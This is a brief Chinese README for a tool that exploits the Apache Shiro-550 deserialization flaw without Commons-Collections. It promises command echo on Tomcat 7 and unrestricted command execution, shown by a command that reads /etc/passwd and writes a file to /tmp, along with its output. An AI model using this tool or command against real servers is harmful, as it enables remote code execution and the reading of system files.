# Shiro-550-with-NoCC

Shiro550 无Commons-collections依赖利用工具：

1. 使用Shiro自身利用链，不依赖Commons-collections库

2. 命令回显，依赖tomcat，支持tomcat7

3. 无限制命令执行，去除java命令执行不能使用管道和重定向符号的限制，如：

   ```shell
   cat /etc/passwd | grep root; echo 8416e1521a05a271074df8417177d090 > /tmp/1; cat 1
   ```

   ```shell
   root:x:0:0:root:/root:/bin/bash
   8416e1521a05a271074df8417177d090
   
    命令执行成功
   ```

   